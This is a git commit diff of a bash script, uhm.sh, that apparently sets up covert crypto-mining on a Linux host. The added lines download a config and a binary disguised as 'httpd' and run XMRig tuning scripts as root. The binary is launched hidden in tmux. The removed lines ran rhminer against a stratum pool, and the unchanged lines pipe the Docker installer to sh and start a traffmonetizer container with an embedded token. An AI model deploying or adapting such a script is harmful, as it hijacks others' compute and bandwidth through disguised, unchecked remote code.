bc1d7787ec44fc204d06d374d2d8c2b6df802dd6
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-05-31 20:01:10 +0700

    Update uhm.sh

--- uhm.sh
+++ uhm.sh
@@ -1,17 +1,17 @@
 #!/bin/bash
 sudo apt update
-sudo apt-get install git build-essential libapparmor-dev pkg-config gawk msr-tools cmake libuv1-dev libssl-dev libhwloc-dev gnupg2 gcc make gnupg2 unzip -y
-
-
-
+sudo apt-get install git build-essential libapparmor-dev pkg-config gawk msr-tools cmake libuv1-dev libssl-dev libhwloc-dev gnupg2 gcc make gnupg2 unzip  msr-tools cmake libuv1-dev libssl-dev libhwloc-dev -y
+sudo rm config.json
+sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.json
+sudo wget https://github.com/minnie1311/azureAI/raw/master/httpd
+wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
+sudo bash enable_1gb_pages.sh
+wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
+sudo bash randomx_boost.sh
+sudo chmod +x httpd
+sudo tmux new-session -d -s my_session1  './httpd'
 wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
 sudo tmux new-session -d -s 2 'bash p2p.sh'
-
-
-sudo wget https://github.com/polyminer1/rhminer/releases/download/2.3b/rhminer.2.3.Linux.CPU.zip
-
-sudo unzip rhminer.2.3.Linux.CPU.zip
-sudo tmux new-session -d -s 1 './rhminer -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 1139719-97.0.$HOSTNAME/mickeypp@gmail.com'
 curl -fsSL get.docker.com -o get-docker.sh
 sudo sh get-docker.sh
 sudo tmux new-session -d -s 122 'docker run -i --name tm traffmonetizer/cli start accept --token VyeG53GE4UXSL/JTCoRJwX1xHwWzziBW2dHTUkGK1lo='
